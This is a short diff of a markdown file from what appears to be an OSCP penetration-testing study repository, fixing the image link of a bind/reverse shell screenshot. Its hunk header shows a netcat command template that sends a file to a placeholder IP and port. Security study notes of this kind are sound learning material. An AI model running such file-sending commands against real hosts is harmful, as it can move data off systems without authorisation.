@@ -29,7 +29,7 @@ nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>
 ![ScreenShot](https://raw.github.com/{username}/{repository}/{branch}/{path})
 
 
-![ScreenShot](https://raw.github.com/SynAckPwn23/Go-For-OSCP/blob/master/Bind_Reverse_shell.png)
+![ScreenShot](https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png)
 
 
 
